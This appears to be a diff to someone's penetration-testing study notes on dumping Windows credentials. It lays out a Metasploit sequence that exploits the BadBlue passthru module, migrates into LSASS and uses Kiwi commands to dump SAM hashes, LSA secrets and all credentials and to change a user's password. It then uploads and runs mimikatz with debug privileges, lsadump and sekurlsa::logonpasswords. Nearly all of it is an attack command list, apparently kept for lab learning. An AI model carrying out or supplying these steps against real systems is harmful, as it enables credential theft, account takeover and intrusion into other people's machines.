@@ -3,3 +3,30 @@ sam database is a database on windows that stores hashed passwords
 mimikatz can extract hashes from the lsass.exe process where hashes are cached
 can also use inbuilt meterpreter extension KIWI
 requires elevated privs
+search badblue
+
+
+use  1 (badblue_passthru)
+  set options
+    exploit
+      pgrep lsas #provides PID of LSAS
+      migrate <lsas PID>
+ load Kiwi
+  ? #help
+  lsa_dump_sam #dumps the lsa sam
+  creds_all #retrieves all credentials
+    windows versions 8.1 do not store clear text passwords
+   lsa_dump_sam #dumps ntlm hash for each user
+   lsa_dump_secrets #dumps secrets
+   password_change #changes password/hash of a  user
+cd C:\\
+  mkdir Temp
+    cd Temp
+      upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+        shell 
+          .\mimikatz.exe
+            privilege::debug
+            lsadump::sam
+            lsadump::secrets
+            sekurlsa::logonpasswords #displays all the logon passwords
+            
